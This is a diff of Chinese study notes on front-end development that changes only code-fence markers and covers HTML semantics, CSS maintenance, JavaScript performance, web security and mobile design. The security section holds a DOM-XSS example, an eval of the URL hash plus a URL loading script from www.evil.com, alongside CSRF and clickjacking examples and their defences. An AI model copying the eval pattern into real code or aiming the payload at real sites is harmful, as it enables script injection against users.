@@ -1,6 +1,8 @@
 ####  **ch1 前端概述**
 * 概述
-~~~
+
+
+```
 从前端UI到后端的数据交互都属于前端开发的范畴
 在页面上留下后端调用的“钩子”
 
@@ -34,16 +36,24 @@ HTTP请求及返回数据
 // 沟通能力
  UI设计师 (效果实现和代价)
  后端工程师(交互接口和传输的数据实体的结构)
-~~~
+
+
+```
 
 * 国内浏览器
-~~~
+
+
+```
 搜狗浏览器 
 360安全浏览器
-~~~
+
+
+```
 
 * 网站重构
-~~~
+
+
+```
 // 建议
 先易后难(命名格式->模块化）
 持续测试（不要大量重构后测试）
@@ -70,26 +80,38 @@ HTML代码不符合标准(废弃元素 marquee 因为可以用JS实现)
 提高加载性能
 CSS Sprite，合并首页背景图
 延长静态资源缓存时间
-~~~
+
+
+```
             
 * W3C指定的标准
-~~~
+
+
+```
 structure HTML4.01
 presentation CSS2
 behavior ECMA DOM
-~~~
+
+
+```
 
 * 安全性-> 富客户端
-~~~
+
+
+```
 跨站点攻击
 Cookie劫持
 伪造恶意代码
 因此需要做必要的安全校验和编码
-~~~
+
+
+```
 
 ####  **ch2 高效开发**
 * 常用的文件组织结构
-~~~
+
+
+```
 --js
     --lib
     --custom.js
@@ -104,16 +126,24 @@ Cookie劫持
 // 文件命名
 jquery-1.8.2.min.js
 bootstrap-responsive.css
-~~~
+
+
+```
 
 * 合并代码文件
-~~~
+
+
+```
 YUI Compresser -> Java
 Web Optimization -> .NET
-~~~
+
+
+```
 
 #### **ch3 标准HTML**
-~~~
+
+
+```
 <noscript>不能用的提示信息</noscript>
 <noscript><meta url=""/></noscript>
 
@@ -123,12 +153,16 @@ name + content 描述网站信息
 http-equiv + content 设置特定的http指令
 
 自定义/注册meta
-~~~
+
+
+```
 
 #### **ch4 HTML - 高可读性**
 * 分隔符不是网页内容的一部分，应该从html中分离，使用css实现 P54
 * [清除浮动](http://www.cnblogs.com/dolphinX/p/3508869.html)时不要有多余的div，也应该写在css P57
-~~~
+
+
+```
  <style>
       .reader li {
           text-indent: -9999px; /* 隐藏说明文字 */
@@ -168,7 +202,9 @@ http-equiv + content 设置特定的http指令
     <div>content</div>
 </section>  
     
-~~~
+
+
+```
 * 不要用br,css实现
 * 背景图css实现, 语义内容img标签
 * text-indent: -999px; //用于说明性的空标签
@@ -195,13 +231,19 @@ http-equiv + content 设置特定的http指令
     * 交互  a button input select
 
 #### **ch5 积极拥抱HTML5**
-~~~
+
+
+```
 记在HTML5基础
-~~~
+
+
+```
 
 #### **ch6 CSS - 高维护性**
 * css分为通用类和业务类，参考结构如下
-~~~
+
+
+```
 css/
 	lib/
     reader/
@@ -212,7 +254,9 @@ css/
     common.css
     default.css
     ie-style.css // 单独写
-~~~
+
+
+```
 * less sass 
 * reset.css
 	* 方案
@@ -245,9 +289,13 @@ css/
 * 兼容ie hack代码
 	* 可以在根元素上
     
-    ~~~
+    
+
+```
     <! --[if IE7]> <html class="ie7"><! [endif]-->
-    ~~~
+    
+
+```
 * em px %
 	* 使用em设置字体 -> gem
     *  使用百分比设置尺寸
@@ -281,22 +329,30 @@ css/
 	* 合并规则: font-size, font-style, font-family...
     * 简介属性值
     
-    ~~~
+    
+
+```
     p.reader-title {
         color: #F3E;
         font-size: .8em;
         padding: 0;
     }
-    ~~~
+    
+
+```
     * 共同声名重复的，单独定义特殊的 
 
-    ~~~
+    
+
+```
     a,
     b {
     }
     a {}
     b {}
-    ~~~
+    
+
+```
     * 继承，归并到父类
     * chrome自带工具来查找无用样式
     	* 内边距设为负值
@@ -329,7 +385,9 @@ css/
 	* 把变量和方法封装到对象里
     * 封装在局部作用域里
 
-    ~~~
+    
+
+```
 	// 防止代码污染
     var hi = (function() {
       var length = 0;
@@ -347,7 +405,9 @@ css/
     }());
 
     hi.init();
-    ~~~
+    
+
+```
 * 使用简化的编码方式 不要用new
 * === 和 ==
 * 避免使用with 多出单独的作用域
@@ -357,11 +417,15 @@ css/
     * Modernizr
     * 兼容代码单独放在文件里
     
-    ~~~
+    
+
+```
     <! -- [if it ie 9]>
       <script src="xx.js"></script>
     <! [endif]-->
-    ~~~
+    
+
+```
 * use strict 
 	* 不要全局启用，放函数里或放在自执行函数里
     * 在已有代码中谨慎启用严格模式 - 重构
@@ -379,14 +443,18 @@ css/
         * 从客户端动态生成页面结构
         	* h5 template标签
         
-        ~~~
+        
+
+```
 
         <script id="main_info" type="text/x-tmpl">
           <li><b>${name}<b> (${class})</li>
         </script>  
 
         var infoTmpl = document.getElementById('main_info').innerHTML();
-        ~~~
+        
+
+```
 * JS模板的使用
 	* Mustache Logic-less 易被集成
     * Handlebars 支持预编译
@@ -408,7 +476,9 @@ css/
         * curl 
         * jquery也可支持
         
-        ~~~
+        
+
+```
         // 防污染
         var module = (function($, mudule2) {
           // code
@@ -425,7 +495,9 @@ css/
             define("jQuery", [], function() { return jQuery; });
           }
         }
-        ~~~
+        
+
+```
 * 合理使用AJAX技术
 	* 明确ajax的使用场景
     	* 有些跳转页面即可
@@ -445,16 +517,22 @@ css/
     * defer(JS代码不会产生页面内容) 和 async(不受限于顺序)
     * 不优雅的方式，动态创建JS元素
     
-~~~
+
+
+```
     var script = document.createElement("script");
     script.type = "text/javascript";
     script.src="file.js";
     document.getElementByTagName_r("head")[0].appendChild(script);
-~~~
+
+
+```
 
 * 拼接字符串的三种方案
 	* 不同浏览器（优化不同）执行速度不同，所以不用计较
-~~~
+
+
+```
 // solution 1
 str += "hello" + "js";
 
@@ -468,7 +546,9 @@ strArr.push('str');
 strArr.push("world");
 str = strArr.join("");
 
-~~~
+
+
+```
 
 * 尽管不能确认最优，但是可以知道什么是可以优化的
 	* 嵌套循环时把大循环当做内循环
@@ -477,7 +557,9 @@ str = strArr.join("");
 * 其他性能优化
 	* 少用 for in
     * clone
-    ~~~
+    
+
+```
     function clone() {
         if(null == obj || "object" != typeof obj) return obj;
         var copy = obj.constructor();
@@ -485,14 +567,18 @@ str = strArr.join("");
         copy.bar = obj.bar;
         return  copy;
     }
-    ~~~
+    
+
+```
 	* 数组尽量不要混合多种数据类型，可以用对象
     * 不要在闭包中返回外部不需要的对象
     * 及时移除dom监听
     * 少用全局变量
     * delete 在chrome中可能妨碍性能优化
     * 避免多次的跨作用查询,作用域链有关
-    ~~~
+    
+
+```
     function update() {
         var doc = document;
         var imgs = doc.getElementsByTagName("img");
@@ -500,17 +586,23 @@ str = strArr.join("");
             imgs[i].title = doc.title + "- image-" + i;   
         }
     }     
-    ~~~
+    
+
+```
 
     * 不推荐使用with，无形中形成作用域
     * try catch, catch处理一脚外部函数
 
-    ~~~
+    
+
+```
           try {
           } catch(ex) {
               errorHandler(ex);
           }
-    ~~~
+    
+
+```
 * DOM操作
 	* 重绘与重排
     	* 增删和修改元素可见性
@@ -524,11 +616,15 @@ str = strArr.join("");
     *  把DOM元素离线或者隐藏后修改
     	* clone DOM 到内存
 		
-        ~~~
+        
+
+```
 		var old = document.getElementById("myElement");
         var clone = old.cloneNode(true);
         old.parentNode.replaceChild(clone, old);
-		~~~
+		
+
+```
     *  设置具有动画效果的DOM元素position为fixed或absolute
     * 谨慎取得DOM元素的布局信息
     	* 浏览器会优化连续的DOM操作
@@ -549,28 +645,40 @@ str = strArr.join("");
     	* 同源策略没有限制页面中加载第三方的脚本
         * 尽一切方法在目标网站上执行非目标网站上原有的脚本
         
-        ~~~
+        
+
+```
         <script>
             eval(location.hash.substr(1));
         </script>
 
         http://host/test.html#document.write("<script/src=//www.evil.com/evil.com/evil/js></script>")
-        ~~~
+        
+
+```
 
     * CSRF 跨站点请求伪造 请求来源于其他网站
-    ~~~
+    
+
+```
     http:www.a,com/del?id=21
-    ~~~
+    
+
+```
     * 界面操作劫持
     	* 点击劫持
         * 拖放劫持
         * eg. 可见输入框内覆盖一个不可见的框
     
-        ~~~
+        
+
+```
         filter: alpha(opacity=0);
         opacity: 0;
         z-index: 100
-        ~~~
+        
+
+```
 
 * 不要轻易相信任何外部传入的数据
 	* 不要轻易信任用户输入的数据 -> 数据过滤
@@ -590,7 +698,9 @@ str = strArr.join("");
     * 防止网页被其他网站内嵌为iframe
     	* JS阻止
         
-        ~~~
+        
+
+```
         <style id="antiClickjack">body{display:none !important; }<style>
 
         <script>
@@ -604,7 +714,9 @@ str = strArr.join("");
         // 首先设置不可见
         // 如果没有被内嵌移除不可见样式
         // 否则把顶层页面的地址设置成内嵌页面的地址
-        ~~~
+        
+
+```
         *   X-Frame-Options响应头
         	* DENY
             * SAMEORIGIN 
@@ -639,9 +751,13 @@ str = strArr.join("");
         	* 目前较好： picturefill JS库
         * meta里设置viewport
         
-        ~~~
+        
+
+```
         <meta name="viewport" content="width=device-width, initial-scale=1">
-        ~~~
+        
+
+```
         * widgets 长宽最少 48px
         * 响应式框架
         	* Foundation
@@ -680,9 +796,13 @@ str = strArr.join("");
         * format-detection // 自动识别电话号码
     * 使用mailto连接, 快速打电话发短信
     
-    ~~~
+    
+
+```
     <a href="tel:1-406-666-xxxx">1-406-666-xxxx</a>
-    ~~~
+    
+
+```
    * 不要使用iframe,慎用table
    	* ul ol 来代替table
     * 或者table竖向显示
@@ -702,10 +822,14 @@ str = strArr.join("");
     * 在不需要选中文字区域禁用文字选中功能
     	* 右键单击 -> 触摸长按
         
-        ~~~
+        
+
+```
         -webkit-user-selector: none;
         -webkit-touch-callout: none;
-        ~~~
+        
+
+```
     * 触发鼠标事件滞后300毫秒（可察觉的延迟）
     	* 模拟click -> tap事件
         * 模拟右键 -> taphold 
